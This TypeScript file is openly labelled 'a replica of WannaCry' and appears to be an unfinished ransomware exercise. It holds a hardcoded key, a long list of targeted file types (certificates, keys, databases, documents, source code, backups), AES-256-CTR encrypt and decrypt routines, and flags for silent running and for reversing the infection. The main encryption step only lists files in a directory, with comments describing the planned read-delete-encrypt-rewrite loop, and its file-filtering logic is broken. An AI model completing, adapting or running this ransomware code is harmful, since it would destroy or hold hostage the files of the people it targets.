import * as crypto from "crypto";

const KEY: string = 'IThr1YRwjTxtrtzbM7RUbF0UdVDx9qNjYTryvf5s1Gih9xnSKl51INbX3NgPcQEJ3W-1ZtpJM1LP2gszMNqfWQ';
let silent_flag: number = 0;
let reversed: number = 0;

const extensions: string[] = [
    ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw",
    ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif",
    ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm",
    ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb",
    ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln",
    ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat",
    ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php",
    ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla",
    ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv",
    ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd",
    ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg",
    ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak",
    ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm",
    ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wk1",
    ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg",
    ".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm",
    ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm",
    ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"
];

const display_ver = ():void => {
    console.log("Version 1.0");
}

const display_help = ():void => {
    console.log('This is a replica of WannaCry');
    console.log('--reverse/-r [KEY] : reverse the infection');
    console.log('--silent/-s : the program will not produce any output');
    console.log('--version/-v: display the version of the program');
}

const decrypt = (buff_encrypted: Buffer, algo: string, key: string): Buffer => {
    const iv: Buffer = buff_encrypted.subarray(0, 16);
    buff_encrypted = buff_encrypted.subarray(16);
    const decipher: crypto.Decipher = crypto.createDecipheriv(algo, key, iv);
    return Buffer.concat([decipher.update(buff_encrypted), decipher.final()]);
}

const reverse_file = (key: string):void => {
    console.log('all file reversed thank to key: ', key);
}

const check_ext = (file: string): boolean => {
    let result: boolean = false;
    for (const ext in extensions) {
        if (file.substring(-ext.length) === ext) {
            result = true;
            return result;
        }
    }
    return result;
}

const encrypt = (buffer: string, algo:string, key: string): Buffer => {
    const iv: Buffer = crypto.randomBytes(16);
    const cipher: crypto.Cipher = crypto.createCipheriv(algo, key, iv);
    return Buffer.concat([iv, cipher.update(buffer), cipher.final()]);
}

const perform_encrypt = async (): Promise<void> => {
    const crypto = require('crypto');
    const algo: string = 'aes-256-ctr';
    let key = crypto.createHash('sha256').update(KEY).digest('base64').substring(0, 32);
    const path = require('path');
    const fs = require('fs');
    const dir_path: string = "/root/inception";
    let files = await fs.promises.readdir(dir_path);
    files.filter((file: string) => check_ext(file));
    files.forEach((file: string) => {
        console.log(file);
    })
    //create a list of all file inside $HOME/inception
    //for each file, read it/ delete it/ encrypt/ write itZ
}



const main = async (argv: any): Promise<void> => {
    argv.shift();
    argv.shift(); // pop two first value (name of program,...)
    argv.forEach((value: any, index: number): void => {
        console.log('index = ', index);
        if (value === '-v' || value === '--version')
            display_ver();
        else if (value === '-h'  || value === '--help')
            display_help();
        else if (value === '-s'  || value === '--silent') {
            console.log('switching to silent version');
            silent_flag = 1;
        }
        else if (value === '-r' || value === '--reverse') {
            if (argv.length <= index + 1) {
                console.error('Cant find key after --reverse option');
                throw new Error("Runtime Error");
            }
            reverse_file(argv[index + 1]);
            argv.splice(index + 1, 1);
            reversed = 1;
        }
        else {
            console.error("Wrong flag");
            console.error('Aborting execution');
            throw new Error("Runtime Error");
        }

    })
    if (!reversed) {
        console.log('performing encryption');
        await perform_encrypt();
    }
}

let tmp = await main(process.argv);
